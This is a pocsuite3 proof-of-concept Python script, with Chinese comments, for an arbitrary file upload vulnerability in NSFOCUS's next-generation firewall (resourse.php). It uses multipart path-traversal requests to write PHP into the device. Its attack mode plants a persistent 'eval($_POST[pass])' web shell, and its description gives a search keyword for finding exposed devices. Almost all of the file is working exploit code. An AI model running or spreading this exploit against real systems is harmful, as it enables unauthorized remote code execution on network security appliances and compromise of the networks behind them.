from collections import OrderedDict
import re,random,hashlib,base64
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE
from pocsuite3.api import OptString
from urllib.parse import urljoin
from pocsuite3.lib.utils import random_str
from requests_toolbelt.multipart.encoder import MultipartEncoder


class DemoPOC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['']  #  PoC作者的大名
    vulDate = '2022-08-04'  #漏洞公开的时间,不知道就写今天
    createDate = '2022-08-04'  # 编写 PoC 的日期
    updateDate = '2022-08-04'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = '绿盟下一代防火墙resourse.php任意文件上传漏洞'  # PoC 名称
    appPowerLink = 'https://www.nsfocus.com.cn/'  # 漏洞厂商主页地址
    appName = '绿盟下一代防火墙'  # 漏洞应用名称
    appVersion = ''''''  # 漏洞影响版本
    samples = ['http://192.168.3.8']  # 测试样列，就是用 PoC 测试成功的目标
    vulType = "File Upload"  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        绿盟下一代防火墙resourse.php任意文件上传漏洞
    # usage : 
        pocsuite -r pocs/nsfocus_firewall_upload.py -f urls.txt --verify
        pocsuite -r pocs/nsfocus_firewall_upload.py -f urls.txt --attack
        pocsuite -r pocs/nsfocus_firewall_upload.py -u http://192.168.3.8 --verify
        pocsuite -r pocs/nsfocus_firewall_upload.py -u http://192.168.3.8 --attack
    # keyword : 
        app="NSFOCUS-下一代防火墙"
    # note:
        连接时要添加headers
        Cookie  :  PHPSESSID_NF=test

    '''

    def _verify(self):
        result = {}
        str_num = str(random.randint(1000000000,9999999999))
        str_md5= hashlib.md5(str_num.encode()).hexdigest()
        headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
            'Content-Type': 'multipart/form-data; boundary=4803b59d015026999b45993b1245f0ef',
            'Cookie': 'PHPSESSID_NF=test',
        }
        url1 = self.url.split('//')[0]+'//'+self.url.split('//')[1].split(':')[0]+':8081'
        path1="/api/v1/device/bugsInfo"
        data1 = """--4803b59d015026999b45993b1245f0ef\nContent-Disposition: form-data; name="file"; filename="sess_test"\n\nlang|s:52:"../../../../../../../../../../../../../../../../tmp/";\n--4803b59d015026999b45993b1245f0ef--"""
        data2 = """--4803b59d015026999b45993b1245f0ef\nContent-Disposition: form-data; name="file"; filename="compose.php"\n\n<?php echo md5({num});unlink(__FILE__);?>\n--4803b59d015026999b45993b1245f0ef--""".format(num=str_num)
 
        url_shell = self.url.split('//')[0]+'//'+self.url.split('//')[1].split(':')[0]+':4433'
        path_shell="/mail/include/header_main.php"
        try:
            requests.post(url=url1+path1,data=data1,headers=headers,timeout=5)
            requests.post(url=url1+path1,data=data2,headers=headers,timeout=5)

            resq = requests.get(url=url_shell+path_shell,headers=headers,timeout=5)
            if str_md5 in resq.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url_shell + path_shell
        except Exception as e:
            return
        return self.parse_output(result)      

    def _attack(self):
        result = {}
        str_num = str(random.randint(1000000000,9999999999))
        str_md5= hashlib.md5(str_num.encode()).hexdigest()
        headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
            'Content-Type': 'multipart/form-data; boundary=4803b59d015026999b45993b1245f0ef',
            'Cookie': 'PHPSESSID_NF=test',
        }
        url1 = self.url.split('//')[0]+'//'+self.url.split('//')[1].split(':')[0]+':8081'
        path1="/api/v1/device/bugsInfo"
        data1 = """--4803b59d015026999b45993b1245f0ef\nContent-Disposition: form-data; name="file"; filename="sess_test"\n\nlang|s:52:"../../../../../../../../../../../../../../../../tmp/";\n--4803b59d015026999b45993b1245f0ef--"""
        data2 = """--4803b59d015026999b45993b1245f0ef\nContent-Disposition: form-data; name="file"; filename="compose.php"\n\n<?php echo md5({num});eval($_POST[pass]);?>\n--4803b59d015026999b45993b1245f0ef--""".format(num=str_num)
 
        url_shell = self.url.split('//')[0]+'//'+self.url.split('//')[1].split(':')[0]+':4433'
        path_shell="/mail/include/header_main.php"

        requests.post(url=url1+path1,data=data1,headers=headers,timeout=5)
        requests.post(url=url1+path1,data=data2,headers=headers,timeout=5)

        resq = requests.get(url=url_shell+path_shell,headers=headers,timeout=5)
        if str_md5 in resq.text:
            result['ShellInfo'] = {}
            result['ShellInfo']['URL'] = url_shell + path_shell
            result['ShellInfo']['URL'] = "<?php eval($_POST[pass]);?>"

        return self.parse_output(result)


    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    

register_poc(DemoPOC)
